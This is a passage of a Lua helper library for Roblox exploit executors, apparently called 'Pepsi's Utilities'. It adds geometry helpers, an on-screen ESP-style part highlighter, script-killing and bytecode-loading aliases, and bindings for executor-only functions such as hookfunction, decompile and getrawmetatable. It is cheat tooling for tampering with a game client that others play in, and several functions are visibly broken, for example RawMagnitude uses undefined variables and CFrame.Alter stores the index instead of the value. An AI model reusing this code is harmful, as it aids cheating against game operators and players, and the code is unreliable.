		func(typ and v or k)
	end
end
pcall(function()
	if setclipboard then
		function table.clip(...)
			setclipboard(table.parse(...))
		end
	end
end) 
table.mix = table.shuffle
--table.subtract = table.negate
--table.minus = table.negate
--table.ffilter = table.filterfunc
--table.filterfunction = table.filterfunc
--table.token = table.dictionary
--table.tokenize = table.dictionary
--table.dict = table.dictionary
--table.tostring = table.parse
--table.string = table.parse
table.unpack = unpack -- For those who are adept outside roblox
function Vector3.Table(v)
	if v and typeof(v) ~= "Vector3" then
		v = Pepsi.ToVector3(v)
	end
	return {X = v.X, Y = v.Y, Z = v.Z}
end
function Vector3.RawMagnitude(vec)
	if vec and typeof(vec) ~= "Vector3" then
		vec = Pepsi.ToVector3(vec)
	end
	if not vec or typeof(vec) ~= "Vector3" then
		Pepsi.Arg(vec, "Vector3", 1, "Vector3.RawMagnitude")
	end
	return math.sqrt(math.pow(x, 2) + math.pow(y, 2) + math.pow(z, 2))
end
function Vector3.alter(vec, mods, y, z, relative)
	if (type(relative) ~= "boolean" and type(relative) ~= "nil") or (type(z) ~= "number" and type(z) ~= "nil") or (typeof(vec) ~= "CFrame" and typeof(vec) ~= "Vector3") or (type(mods) ~= "number" and type(mods) ~= "table") or (type(y) ~= "number" and type(y) ~= "nil") then
		Pepsi.Arg(vec, {"Vector3", "CFrame"}, 1, "Vector3.alter")
		Pepsi.Arg(mods, {"table", "number"}, 2, "Vector3.alter")
		Pepsi.Arg(y, {"nil", "number"}, 3, "Vector3.alter")
		Pepsi.Arg(z, {"nil", "number"}, 4, "Vector3.alter")
		Pepsi.Arg(relative, {"nil", "boolean"}, 5, "Vector3.alter")
	end
	local x, y, z, relative = math.nan, math.nan, math.nan, false
	if type(mods) == "table" then
		x, y, z, relative = mods.x, mods.y, mods.z, (mods.relative or mods.rel) == true
	elseif type(mods) == "number" then
		x, y, z, relative = mods, y, z, relative == true
	end
	if (type(relative) ~= "nil" and type(relative) ~= "boolean") or (type(z) ~= "nil" and type(z) ~= "number") or (type(y) ~= "nil" and type(y) ~= "number") or (type(x) ~= "nil" and type(x) ~= "number") then
		Pepsi.Arg(x, {"nil", "number"}, 2, "Vector3.alter")
		Pepsi.Arg(y, {"nil", "number"}, 3, "Vector3.alter")
		Pepsi.Arg(z, {"nil", "number"}, 4, "Vector3.alter")
		Pepsi.Arg(relative, {"nil", "boolean"}, 5, "Vector3.alter")
	end
	local vec = Pepsi.ToVector3(vec)
	if relative then
		x, y, z = tonumber(math.isnan(x) and 0 or x), tonumber(math.isnan(y) and 0 or y), tonumber(math.isnan(z) and 0 or z)
		return vec + Vector3.new(x, y, z)
	else
		local nx, ny, nz = vec.X, vec.Y, vec.Z
		x, y, z = (not math.isnan(x) and x), (not math.isnan(y) and y), (not math.isnan(z) and z)
		if type(x) == "number" then
			nx = x
		end
		if type(y) == "number" then
			ny = y
		end
		if type(z) == "number" then
			nz = z
		end
		return Vector3.new(nx, ny, nz)
	end
	return Pepsi.ToVector3(vec)
end
function Vector3.Corners(vec, size)
	if size == nil and Pepsi.IsA(vec, "BasePart") then
		vec, size = vec.CFrame, vec.Size
	elseif size == nil and type(vec) == "table" then
		if vec.Size and vec.CFrame then
			vec = vec.CFrame
			size = vec.Size
		else
			vec, size = unpack(vec)
		end
	elseif vec ~= nil and nil ~= size then
		vec, size = Pepsi.ToCFrame(vec), Pepsi.ToVector3(size)
	end
	if typeof(vec) ~= "CFrame" or typeof(size) ~= "Vector3" then
		return false
	end
	local corners = {}
	corners[1] = vec + (size / 2)
	corners[2] = vec + (size * Vector3.new(-1, 1, 1) / 2)
	corners[3] = vec + (size * Vector3.new(-1, 1, -1) / 2)
	corners[4] = vec + (size * Vector3.new(1, 1, -1) / 2)
	corners[5] = vec + (size * Vector3.new(1, -1, 1) / 2)
	corners[6] = vec + (size * Vector3.new(-1, -1, 1) / 2)
	corners[7] = vec + (-size / 2)
	corners[8] = vec + (size * Vector3.new(1, -1, -1) / 2)
	return corners
end
function Vector3.Ranges(vecs, ...)
	if Pepsi.IsA(vecs, "BasePart") then
		vecs = Vector3.Corners(vecs)
	elseif typeof(vecs) == "Vector3" or "CFrame" == typeof(vecs) then
		vecs = {vecs, ...}
	end
	if type(vecs) ~= "table" then
		return false
	end
	local ranges = {
		X = {},
		Y = {},
		Z = {}
	}
	for _, v in pairs(vecs) do
		local vec = Pepsi.ToVector3(v)
		if vec then
			if not ranges.X[1] or vec.X < ranges.X[1] then
				ranges.X[1] = vec.X
			end
			if not ranges.X[2] or vec.X > ranges.X[2] then
				ranges.X[2] = vec.X
			end
			
			if not ranges.Y[1] or vec.Y < ranges.Y[1] then
				ranges.Y[1] = vec.Y -- Ninjas have two legs
			end
			if not ranges.Y[2] or vec.Y > ranges.Y[2] then
				ranges.Y[2] = vec.Y
			end
			
			if not ranges.Z[1] or vec.Z < ranges.Z[1] then
				ranges.Z[1] = vec.Z
			end
			if not ranges.Z[2] or vec.Z > ranges.Z[2] then
				ranges.Z[2] = vec.Z
			end
		end
	end
	return ranges
end
function Vector3.PointFromRange(range, override)
	if (type(range) ~= "table" and typeof(range) ~= "Instance") or (type(override) ~= "table" and type(override) ~= "nil") then
		Pepsi.Arg(range, {"table", "Instance"}, 1, "Vector3.PointFromRange")
		Pepsi.Arg(override, {"nil", "table"}, 1, "Vector3.PointFromRange")
	end
	if typeof(range) == "Instance" and range:IsA("BasePart") then
		range = Vector3.Ranges(range)
		Pepsi.Arg(range, "table", 1, "Vector3.PointFromRange", "Couldn't get ranges of a " .. tostring(range.ClassName))
	elseif type(range) ~= "table" then
		Pepsi.Arg(range, {"table"}, 1, "Vector3.PointFromRange", "Couldn't get ranges of a " .. tostring(range.ClassName))
	end
	if not range or type(range) ~= "table" then
		Pepsi.Arg(range, "table", 1, "Vector3.PointFromRange", "Couldn't get ranges")
	end
	if "table" ~= type(range.X) or "table" ~= type(range.Y) or type(range.Z) ~= "table" then
		Pepsi.Arg(range, "table/sub table", 1, "Vector3.PointFromRange", "Sub items are not tables")
	end
	override = override or {}
	local ranx, rany, ranz = rawget(override, "X") or math.random(unpack(range.X)), rawget(override, "Y") or math.random(unpack(range.Y)), rawget(override, "Z") or math.random(unpack(range.Z))
	if ranx and rany and ranz then
		return Vector3.new(ranx, rany, ranz)
	end
end
function Vector3.InRegion(vec, obj, def)
	if vec == nil and obj ~= nil then
		return false
	end
	if def == nil then
		def = true
	end
	if obj == nil then
		obj = Pepsi.Me()
	end
	if type(vec) ~= "table" or obj == nil then
		if Pepsi.IsA(vec, "BasePart") and obj ~= nil then
			vec = Vector3.Ranges(vec)
		end
		if type(vec) ~= "table" or obj == nil then
			return false
		end
	end
	obj = Pepsi.ToVector3(obj)
	if typeof(obj) ~= "Vector3" then
		return false
	end
	if vec.X and not vec.x then
		vec.x = vec.X
	end
	if vec.Y and not vec.y then
		vec.y = vec.Y
	end
	if vec.Z and not vec.z then
		vec.z = vec.Z
	end
	if type(vec.x) == "table" and type(vec.y) == "table" and type(vec.z) == "table" then
		table.sort(vec.x)
		table.sort(vec.y)
		table.sort(vec.z)
		if obj.X < vec.x[1] then
			return false
		elseif obj.X > vec.x[2] then
			return false
		elseif obj.Y < vec.y[1] then -- FUCK!		Sorry, this looked like a good spot to put this.
			return false
		elseif obj.Y > vec.y[2] then
			return false
		elseif obj.Z < vec.z[1] then
			return false
		elseif obj.Z > vec.z[2] then
			return false
		end
	else
		return false
	end
	return def
end
function Vector3.Direction(vec1, vec2)
	vec1 = (typeof(vec1) == "Vector3" and vec1) or Pepsi.ToVector3(vec1)
	vec2 = (typeof(vec2) == "Vector3" and vec2) or Pepsi.ToVector3(vec2)
	if typeof(vec1) ~= "Vector3" or typeof(vec2) ~= "Vector3" then
		Pepsi.Arg(vec1, {"Vector3"}, 1, "Vector3.Direction")
		Pepsi.Arg(vec2, {"Vector3"}, 2, "Vector3.Direction")
	end
	return vec1 - vec2 -- Srsly guys, you dont need to request stuff that can be done in 2 seconds
end
Vector3.Region = Vector3.InRegion
Vector3.GetDirection = Vector3.Direction
function Ray.ToPart(ray, width, part, cleanup)
	if (typeof(ray) ~= "Ray" and type(ray) ~= "table") or (type(width) ~= "nil" and type(width) ~= "number" and typeof(width) ~= "Vector3") or (type(part) ~= "nil" and typeof(part) == "Instance" and not part:IsA("BasePart")) or (type(cleanup) ~= "nil" and type(cleanup) ~= "number" and type(cleanup) ~= "boolean") then
		Pepsi.Arg(ray, {"Ray", "table"}, 1, "Ray.ToPart")
		Pepsi.Arg(width, {"nil", "Vector3", "number"}, 2, "Ray.ToPart")
		Pepsi.Arg(part, {"nil", "BasePart"}, 3, "Ray.ToPart", nil, nil, true)
		Pepsi.Arg(cleanup, {"nil", "number", "boolean"}, 4, "Ray.ToPart")
	end
	if type(ray) == "table" then
		ray = Ray.new(unpack(ray))
	end
	part = part or Instance.new("Part")
	part.CFrame = CFrame.new(ray.Origin:Lerp(ray.Direction, 0.5), ray.Direction)
	if typeof(width) == "Vector3" then
		part.Size = Vector3.new(width.X, width.Y, (ray.Origin - ray.Direction).Magnitude + width.Z)
	else
		width = width or 1
		part.Size = Vector3.new(width, width, (ray.Origin - ray.Direction).Magnitude)
	end
	if cleanup then
		Pepsi.Service("Debris"):AddItem(part, tonumber(cleanup))
	end
end
function Region3.FromPart(p, size) -- Lord give me fucking strength. please.
	if (typeof(p) ~= "Instance" and typeof(p) ~= "Vector3") or (type(size) ~= "nil" and typeof(size) ~= "Vector3") then
		Pepsi.Arg(p, {"Vector3", "Instance"}, 1, "Region3.FromPart")
		Pepsi.Arg(size, {"nil", "Vector3"}, 2, "Region3.FromPart")
	end
	if typeof(p) == "Vector3" and typeof(size) ~= "Vector3" then
		Pepsi.Arg(size, "Vector3", 2, "Region3.FromPart")
	end
	if typeof(p) == "Vector3" and typeof(size) == "Vector3" then
		p = Instance.Make("Part", {
			Position = p,
			Size = size,
			Anchored = true
		}, 60)
	end
	if not p:IsA("BasePart") then
		Pepsi.Arg(nil, "Instance", 1, "Region3.FromPart", "Value needs to be a BasePart")
	end
	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = p.CFrame:GetComponents()
	local wsx, wsy, wsz = (math.abs(R00) * p.Size.X + math.abs(R01) * p.Size.Y + math.abs(R02) * p.Size.Z) / 2, (math.abs(R10) * p.Size.X + math.abs(R11) * p.Size.Y + math.abs(R12) * p.Size.Z) / 2, (math.abs(R20) * p.Size.X + math.abs(R21) * p.Size.Y + math.abs(R22) * p.Size.Z) / 2
	return Region3.new(Vector3.new(x - wsx, y - wsy, z - wsz), Vector3.new(x + wsx, y + wsy, z + wsz))
end
function Region3.NearbyParts(dist, origin, ignoreins, max) -- Lord give me fucking strength. please.
	if (typeof(ignoreins) ~= "Instance" and type(ignoreins) ~= "nil") or (type(dist) ~= "number" and type(dist) ~= "nil") or (typeof(origin) ~= "Instance" and typeof(origin) ~= "Vector3" and typeof(origin) ~= "CFrame" and type(origin) ~= "nil") then
		Pepsi.Arg(dist, {"number", "nil"}, 1, "Region3.NearbyParts")
		Pepsi.Arg(origin, {"Instance", "nil", "Vector3", "CFrame"}, 2, "Region3.NearbyParts")
		Pepsi.Arg(ignoreins, {"Instance", "nil"}, 3, "Region3.NearbyParts")
		Pepsi.Arg(max, {"number", "nil"}, 4, "Region3.NearbyParts")
	end
	ignoreins = (ignoreins == nil and origin == nil and Pepsi.Lp.Character) or ignoreins or nil
	origin = (typeof(origin) ~= "Vector3" and origin) or (typeof(origin) == "CFrame" and origin.Position) or Pepsi.ToVector3(origin or Pepsi.Lp.Character)
	dist = math.abs(tonumber(tonumber(dist or 30) or 30))
	if "Vector3" ~= typeof(origin) then
		Pepsi.Arg(2, {"Instance", "Vector3", "CFrame"}, 2, "Region3.NearbyParts", "Value needs to have an origin")
	end
	return workspace:FindPartsInRegion3(Region3.FromPart(Instance.Make("Part", {
		Position = origin,
		Size = Vector3.new(dist, dist, dist)
	}, 10)), ignoreins, max)
end
function Region3.ToPart(reg, props, debris)
	if typeof(reg) ~= "Region3" or (type(debris) ~= "nil" and type(debris) ~= "number") or (type(props) ~= "nil" and type(props) ~= "table") then
		Pepsi.Arg(reg, "Region3", 1, "Region3.ToPart")
		Pepsi.Arg(props, {"nil", "table"}, 2, "Region3.ToPart")
		Pepsi.Arg(debris, {"nil", "number"}, 3, "Region3.ToPart")
	end
	return Instance.Make("Part", (props or {
		CFrame = reg.CFrame,
		Size = reg.Size,
		Anchored = true,
		Transparency = 0.7,
		BrickColor = BrickColor.Random(),
		CanCollide = false,
		Parent = workspace
	}), debris)
end
function Region3.GetPlayers(region)
	if typeof(region) ~= "Region3" then
		Pepsi.Arg(region, {"Region3"}, 1, "Region3.GetPlayers")
	end
	return Pepsi.PartsToPlayers(workspace:FindPartsInRegion3(region))
end
function CFrame.Alter(...)
	local args = {...}
	local orig = table.remove(args, #args)
	if typeof(orig) ~= "CFrame" then
		Pepsi.Arg(orig, "CFrame", #args + 1, "CFrame.Alter")
	end
	local new = {orig:GetComponents()}
	for k, v in pairs(args) do
		if type(v) == "number" then -- If it's replaced with "nil", it uses value from original CFrame
			new[k] = k
		end
	end
	return CFrame.new(unpack(new))
end
function CFrame.KeepAngles(vec, y, z, part)
	if vec and type(vec) == "number" then
		if type(y) ~= "number" or type(z) ~= "number" or ((typeof(part) ~= "Instance" or not part:IsA("BasePart")) and typeof(part) ~= "CFrame") then
			Pepsi.Arg(y, "number", 2, "CFrame.KeepAngles")
			Pepsi.Arg(z, "number", 3, "CFrame.KeepAngles")
			Pepsi.Arg(part, {"CFrame", "Part"}, 4, "CFrame.KeepAngles")
		end
		vec = Vector3.new(vec, y, z)
	else
		part = y
		if (not part or (typeof(part) ~= "CFrame" and not (typeof(part) == "Instance" and part.ClassName == "Part"))) or (not vec or (typeof(vec) ~= "Vector3" and typeof(vec) ~= "CFrame") and not (typeof(vec) == "Instance" and vec.ClassName == "Part")) then
			Pepsi.Arg(vec, {"Vector3", "CFrame", "Part"}, 1, "CFrame.KeepAngles")
			Pepsi.Arg(part, {"CFrame", "Part"}, 2, "CFrame.KeepAngles")
		end
	end
	local x = {}
	vec = Pepsi.ToVector3(vec)
	if part and typeof(part) == "Instance" and part:IsA("BasePart") then
		x = {part.CFrame:GetComponents()}
	elseif typeof(part) == "CFrame" then
		x = {part:GetComponents()}
	end
	return CFrame.new(unpack(rawset(rawset(rawset(x, 3, vec.Z), 2, vec.Y), 1, vec.X)))
end
function CFrame.LookAt(targ, from) -- This is the kind of stuff that gets requested...
	targ = Pepsi.ToVector3(targ)
	from = Pepsi.ToVector3(from or workspace.CurrentCamera.CFrame.Position)
	if typeof(targ) ~= "Vector3" and typeof(from) ~= "Vector3" then
		Pepsi.Arg(targ, "Vector3", 1, "CFrame.LookAt")
		Pepsi.Arg(from, "Vector3", 2, "CFrame.LookAt")
	end
	return CFrame.new(from, targ) -- Really guys, it's not that hard.
end
CFrame.Look = CFrame.LookAt
if Drawing and type(Drawing) == "table" and type(Drawing.new) == "function" and type(getgenv) == "function" then
	local Drawing = setmetatable({}, {__index = Drawing})
	function Drawing.Highlight(part, properties) -- Another GOD function
		if not Drawing or not Drawing.new then
			local function dummy()
				return warn("Drawing api absent")
			end
			dummy()
			return {
				Lines = {},
				Remove = dummy,
				Show = dummy,
				Hide = dummy,
				Visible = dummy
			}
		end
		local sizemult = 1
		local af = true
		local debris = false
		local offset = Vector3.new()
		local visible = true
		if type(properties) == "boolean" then
			visible = properties
		end
		if type(properties) == "table" and type(properties.SizeMult) == "number" then
			sizemult, properties.SizeMult = properties.SizeMult, nil
		end
		if type(properties) == "table" and type(properties.AutoRefresh) ~= "nil" then
			af, properties.AutoRefresh = not not properties.AutoRefresh, nil
		end
		if type(properties) == "table" and type(properties.Debris) == "number" then
			debris, properties.Debris = not not properties.Debris, nil
		end
		local DrawObject = {
			Lines = {
				Drawing.new("Line"),
				Drawing.new("Line"),
				Drawing.new("Line"),
				Drawing.new("Line")
			},
			AutoRefresh = false,
			Visible = not not visible,
			Connections = {}
		}
		local ranc = BrickColor.Random().Color
		local function mathstuff(part, line, num)
			if not part or not line or type(num) ~= "number" then
				return
			end
			local x, e = pcall(function()
				local pos, size
				if part:IsA("Model") then
					pos, size = part:GetBoundingBox()
				elseif part:IsA("BasePart") then
					pos, size = part.CFrame, part.Size
				end
				sizemult = tonumber(sizemult or 1) or 1
				size = size * sizemult
				local cam = workspace.CurrentCamera
				local tl, tlv = cam:WorldToViewportPoint(pos:ToWorldSpace(CFrame.new(size.X, size.Y, 0)).Position)
				local tr, trv = cam:WorldToViewportPoint(pos:ToWorldSpace(CFrame.new(-size.X, size.Y, 0)).Position)
				local bl, blv = cam:WorldToViewportPoint(pos:ToWorldSpace(CFrame.new(size.X, -size.Y, 0)).Position)
				local br, brv = cam:WorldToViewportPoint(pos:ToWorldSpace(CFrame.new(-size.X, -size.Y, 0)).Position)
				if not (tlv or trv or blv or brv) then
					line.Visible = false
					return
				end
				if num == 1 then
					line.From = Vector2.new(tl.X, tl.Y)
					line.To = Vector2.new(tr.X, tr.Y)
				elseif num == 2 then
					line.From = Vector2.new(tr.X, tr.Y)
					line.To = Vector2.new(br.X, br.Y)
				elseif num == 3 then
					line.From = Vector2.new(bl.X, bl.Y)
					line.To = Vector2.new(tl.X, tl.Y)
				elseif num == 4 then
					line.From = Vector2.new(br.X, br.Y)
					line.To = Vector2.new(bl.X, bl.Y)
				end
				
				line.Color = Pepsi.Obj({default = ranc}, part, "BrickColor", "Color") or BrickColor.Red().Color
				line.Thickness = 5
				line.Visible = not not visible
				if type(properties) == "table" then
					for prop, val in pairs(properties) do
						local x, e = pcall(function()
							if typeof(val) == "BrickColor" then
								val = val.Color
							end
							line[prop] = val
						end)
						if not x then
							warn(e)
						end
					end
				end
			end)
			if not x then
				warn(e)
				if line.Remove then
					pcall(function()
						pcall(line.Remove, line)
						line = nil
					end)
				end
			end
		end
		if type(properties) == "number" then
			delay(properties, function()
				DrawObject:Remove()
			end)
		end
		if type(debris) == "number" then
			delay(debris, function()
				DrawObject:Remove()
			end)
		end
		local DrawClass
		DrawClass = Pepsi.NewClass("Highlight", {
			Lines = {
				value = { -- Ninjas our stelthy
					Drawing.new("Line"),
					Drawing.new("Line"),
					Drawing.new("Line"),
					Drawing.new("Line")
				},
				types = "nil" -- Can only delete
			},
			AutoRefresh = {
				value = true,
				types = {"boolean"}
			},
			Visible = {
				value = (not not visible),
				types = "boolean"
			},
			Threads = {
				value = {},
				types = "table"
			},
			Remove = {
				value = function(self)
					if self and self.Lines then
						for _, line in pairs(self.Lines) do
							pcall(function()
								line:Remove()
								line = nil
							end)
						end
						self.Lines = nil
						self = nil
					end
					DrawClass = nil
				end,
				readonly = true
			},
			Refresh = {
				value = function(self, newpart)
					if self and self.Lines then
						for num, line in pairs(self.Lines) do
							pcall(mathstuff, (newpart or part), line, num)
						end
					end
				end,
				readonly = true
			},
			Visibility = {
				value = function(self, bool)
					if self and self.Lines then
						for _, line in pairs(self.Lines) do
							pcall(function()
								if type(bool) ~= "boolean" or bool == nil then
									line.Visible = not line.Visible
								elseif type(bool) == "boolean" then
									line.Visible = bool
								end
							end)
						end
					end
				end,
				readonly = true
			},
			Property = {
				value = function(self, tab)
					if type(tab) ~= "table" then
						Pepsi.Arg(tab, "table", 1, "Property")
					end
					if self and self.Lines then
						for _, line in pairs(self.Lines) do
							for prop, val in pairs(tab) do
								line[prop] = val
							end
						end
					end
				end,
				readonly = true
			},
			Show = {
				value = function(self)
					if self and self.Lines then
						for _, line in pairs(self.Lines) do
							pcall(function()
								line.Visible = true
							end)
						end
					end
				end,
				readonly = true
			},
			Hide = {
				value = function(self)
					if self and self.Lines then
						for _, line in pairs(self.Lines) do
							pcall(function()
								line.Visible = false
							end)
						end
					end
				end,
				readonly = true
			}
		}, false, nil, {
			__newindex = {
				before = true,
				value = function(self, t, v)
					if t == "Visible" and type(v) == "boolean" then
						if v and self and self.Show then
							self:Show()
						elseif not v and self and self.Hide then
							self:Hide()
						end
					end
					if t == "AutoRefresh" and type(v) == "boolean" then
						if self and self.Threads and v then
							self.Threads.AutoRefresh = coroutine.create(function(t)
								while Pepsi.Rs:Wait() and self and self.Refresh and self.AutoRefresh do
									self:Refresh()
								end
								coroutine.yield()
								self.Threads.AutoRefresh = nil
							end)
							coroutine.resume(self.Threads.AutoRefresh)
						end
					end
				end
			}
		})
		DrawClass:Refresh()
		return DrawClass
	end
	getgenv().Drawing = Drawing
	Pepsi.Highlight = Drawing.Highlight
end

local function typeof(val)
	local rbxt = robloxtype(val)
	if rbxt == "userdata" then
		local s, t = pcall(function()
			return tostring(val.ClassName or "userdata") or "userdata"
		end)
		if s and t then
			return t
		end
		return "userdata"
	end
	return rbxt
end

if not Pepsi.Tick and not gethwid and not GetObjects and not HttpGet and not ReplaceString and not SetProxy then -- Fuck sirhurt fucking this up.
	Pepsi.TickService = Pepsi.NewClass("TickService", {}, false, {
		Tick = {
			triggers = {
				Pepsi.Service("RunService").RenderStepped,
				Pepsi.Service("RunService").Heartbeat,
				Pepsi.Service("RunService").Stepped
			}
		},
		SuperTick = {
			triggers = {
				Pepsi.Service("RunService").RenderStepped,
				Pepsi.Service("RunService").Heartbeat,
				Pepsi.Service("RunService").Stepped,
				game.ItemChanged
			}
		}
	})
	Pepsi.Tick = Pepsi.TickService.Tick
	table.allset(Pepsi, {"SuperTick", "STick"}, Pepsi.TickService.SuperTick)
--	Pepsi.SuperTick = Pepsi.TickService.SuperTick
--	Pepsi.STick = Pepsi.TickService.SuperTick
elseif not Pepsi.Tick then
	table.allset(Pepsi, {"Tick", "SuperTick", "STick"}, Pepsi.Rs) -- Sirhurt anti-fuck-up
--	Pepsi.Tick = Pepsi.Rs
--	Pepsi.STick, Pepsi.SuperTick = Pepsi.Rs, Pepsi.Rs
end

pcall(function()
	table.allset(Pepsi, {"Childrenize", "childrenize", "children", "Children", "Descendants", "descendants", "descendantation", "Descendantation"}, Pepsi.MapChildren)
	table.allset(Pepsi, {"KAS", "kas", "Kas", "KaS"}, Pepsi.KillAllScripts)
	table.allset(Pepsi, {"ByteCode", "Bytecode", "LoadBytecode"}, Pepsi.LoadByteCode)
	table.allset(Pepsi, {"Humanoid", "GetHuman", "GetHumanoid"}, Pepsi.Human)
	table.allset(Pepsi, {"Waypoint", "Waypoints"}, Pepsi.FromWaypoints)
	table.allset(Pepsi, {"HoverGui", "GuiUnderMouse", "GuiMouse", "GetGui", "UnderMouse", "waila"}, Pepsi.HoveredGui)
	table.allset(Pepsi, {"Enemy", "Enemies", "GetEnemies"}, Pepsi.GetEnemy)
	table.allset(Pepsi, {"WaitFor", "WaitOn"}, Pepsi.WaitOnAny)
	table.allset(Pepsi, {"yfecall", "fyecall", "yefcall", "feycall", "eyfcall"}, Pepsi.efycall)
	table.allset(Pepsi, {"fyscall", "sfycall", "yfscall", "syfcall", "ysfcall"}, Pepsi.fsycall)
	table.allset(Color3, {"Mix", "mix", "Blend"}, Color3.blend)
	table.allset(Instance, {"Make", "Create"}, Instance.make)
	table.allset(math, {"newrange", "relativeconstraint", "torange"}, math.relativerange)
	table.allset(math, {"ilerp", "invlerp"}, math.inverselerp)
	table.allset(math, {"percentage", "percentof", "calcpercent"}, math.percent)
	table.allset(table, {"exclude", "subtract", "minus"}, table.negate)
	table.allset(table, {"ffilter", "filterfunction"}, table.filterfunc)
	table.allset(table, {"tostring", "string"}, table.parse)
	table.allset(table, {"token", "tokenize", "dict"}, table.dictionary)
end)

pcall(function()
	if getgenv then
		Pepsi.ycall(function() -- Protected, spawned call
			if not getgenv then
				return
			end
			for k = 1, 20 do
				pcall(function()
					if Pepsi.Service("Players").LocalPlayer then
						getgenv().Pepsi.Lp = Pepsi.Service("Players").LocalPlayer
					end
				end)
				wait(1)
				if Pepsi.Lp then
					break
				end
			end
		end)
	end
end)

if not shared.PepsiUtil then
	shared.PepsiUtil = true
	Pepsi.Msg("Pepsi's Utilites Loaded! (Version:" .. tostring(_version) .. ")")
else
	Pepsi.Msg("Pepsi's Utilites Reloaded! (Version:" .. tostring(_version) .. ")")
end
auto_exec = auto_exec and type(getgenv) == "function" and type(getgenv()) == "table" -- In short, if you don't have getgenv, autoexec won't work, and hense runs it regularly (You're welcome... ....... *cough* to buy synapse *cough*..... oh my bad, excuse me.. really stuffy throught tonight... *wheeze* ....... What the FUCK am i typing? A book? a role play? Maybe a skit... Ok srsly, time to move on. godmanit)

pcall(function()
	if type(getgenv) == "function" then
		local didwarn = false
		local dowarn = warn
		function dowarn(msg, ...)
			if not shared.debugfuncs then
				return
			end
			if not didwarn then
				dowarn, didwarn = warn, true
				warn("These are not errors! They are only missing functions.")
			end
			return warn(msg, ...)
		end
		local genv = getgenv()
		if not shared.skip_compat then
			Pepsi.Compatible()
		end
		shared.dbg = shared.dbg or {}
		genv.robloxtype = genv.robloxtype or robloxtype
		genv.typeof = typeof
		genv.Color3, genv.Instance, genv.math, genv.string, genv.table, genv.Vector3, genv.Pepsi, genv.dbg = setmetatable({}, {__index = Color3}), setmetatable({}, {__index = Instance}), setmetatable({}, {__index = math}), setmetatable({rtl = utf8.char(8238)}, {__index = string}), setmetatable({}, {__index = table}), setmetatable({}, {__index = Vector3}), Pepsi, setmetatable({
			tb = traceback or debug.traceback or getrenv().debug.traceback or rawget(shared.dbg, "tb") or dowarn("shared.dbg.tb needs to be set to 'debug.traceback' function!"),
			grmt = getrawmetatable or rawget(shared.dbg, "grmt") or dowarn("shared.dbg.grmt needs to be set to 'getrawmetatable' function!"),
			pe = debug.profileend or rawget(shared.dbg, "pe") or dowarn("shared.dbg.pe needs to be set to 'debug.profileend' function!"),
			pb = debug.profilebegin or rawget(shared.dbg, "pb") or dowarn("shared.dbg.pb needs to be set to 'debug.profilebegin' function!"),
			srmt = setrawmetatable or rawget(shared.dbg, "srmt") or dowarn("shared.dbg.srmt needs to be set to 'setrawmetatable' function!"),
			iro = isreadonly or rawget(shared.dbg, "iro") or dowarn("shared.dbg.iro needs to be set to 'isreadonly' function!"),
			ie = identifyexecutor or rawget(shared.dbg, "ie") or dowarn("shared.dbg.ie needs to be set to 'identifyexecutor' function!"),
			sro = setreadonly or rawget(shared.dbg, "sro") or dowarn("shared.dbg.sro needs to be set to 'setreadonly' function!"),
			mro = make_readonly or rawget(shared.dbg, "mro") or dowarn("shared.dbg.mro needs to be set to 'make_readonly' function!"),
			gifs = getinstancefromstate or rawget(shared.dbg, "gifs") or dowarn("shared.dbg.gifs needs to be set to 'getinstancefromstate' function!"),
			shp = sethiddenprop or rawget(shared.dbg, "shp") or dowarn("shared.dbg.shp needs to be set to 'sethiddenprop' function!"),
			ghp = gethiddenproperty or gethiddenprop or rawget(shared.dbg, "ghp") or dowarn("shared.dbg.ghp needs to be set to 'gethiddenprop' function!"),
			ghps = gethiddenproperties or gethiddenprops or rawget(shared.dbg, "ghps") or dowarn("shared.dbg.ghps needs to be set to 'gethiddenprops' function!"),
			vl = debug.validlevel or rawget(shared.dbg, "vl") or dowarn("shared.dbg.vl needs to be set to 'validlevel' function!"),
			sff = syn_setfflag or setfflag or rawget(shared.dbg, "sff") or dowarn("shared.dbg.sff needs to be set to 'setfflag' function!"),
			gsi = getspecialinfo or syn_obj_specialinfo or rawget(shared.dbg, "gsi") or dowarn("shared.dbg.gsi needs to be set to 'getspecialinfo' function!"),
			dec = syn_decompile or decompile or rawget(shared.dbg, "dec") or dowarn("shared.dbg.dec needs to be set to 'decompile' function!"),
			ls = loadstring or rawget(shared.dbg, "ls") or dowarn("shared.dbg.ls needs to be set to 'loadstring' function!"),
			hf = hookfunction or hookfunc or rawget(shared.dbg, "hf") or dowarn("shared.dbg.hf needs to be set to 'hookfunction' function!"),
			ira = syn_isactive or isrbxactive or rawget(shared.dbg, "ira") or dowarn("shared.dbg.ira needs to be set to 'isrbxactive' function!"),
			ds = syn_dumpstring or dumpstring or rawget(shared.dbg, "ds") or dowarn("shared.dbg.ds needs to be set to 'dumpstring' function!"),
			si = saveinstance or rawget(shared.dbg, "si") or dowarn("shared.dbg.si needs to be set to 'saveinstance' function!"),
			vfgw = validfgwindow or rawget(shared.dbg, "vfgw") or dowarn("shared.dbg.vfgw needs to be set to 'validfgwindow' function!"),
			isf = isfile or rawget(shared.dbg, "isf") or dowarn("shared.dbg.isf needs to be set to 'isfile' function!"),
			fti = firetouchinterest or rawget(shared.dbg, "fti") or dowarn("shared.dbg.fti needs to be set to 'firetouchinterest' function!"),
			rc = replaceclosure or rawget(shared.dbg, "rc") or dowarn("shared.dbg.rc needs to be set to 'replaceclosure' function!"),
			xpr = XPROTECT or rawget(shared.dbg, "xpr") or dowarn("shared.dbg.xpr needs to be set to 'XPROTECT' function!"),
			gcst = getcallstack or rawget(shared.dbg, "gcst") or dowarn("shared.dbg.gcst needs to be set to 'getcallstack' function!"),
			pc = printconsole or rawget(shared.dbg, "pc") or dowarn("shared.dbg.pc needs to be set to 'printconsole' function!"),
			lf = listfiles or rawget(shared.dbg, "lf") or dowarn("shared.dbg.lf needs to be set to 'setreadonly' function!"),
			ilc = syn_islclosure or islclosure or is_lclosure or rawget(shared.dbg, "ilc") or dowarn("shared.dbg.ilc needs to be set to 'islclosure' function!"),
			scb = syn_clipboard_set or setclipboard or rawget(shared.dbg, "scb") or dowarn("shared.dbg.scb needs to be set to 'setclipboard' function!"),
			gpv = getpropvalue or rawget(shared.dbg, "gpv") or dowarn("shared.dbg.gpv needs to be set to 'getpropvalue' function!"),
			gpfs = getpointerfromstate or rawget(shared.dbg, "gpfs") or dowarn("shared.dbg.gpfs needs to be set to 'getpointerfromstate' function!"),
			spv = setpropvalue or rawget(shared.dbg, "spv") or dowarn("shared.dbg.spv needs to be set to 'setpropvalue' function!"),
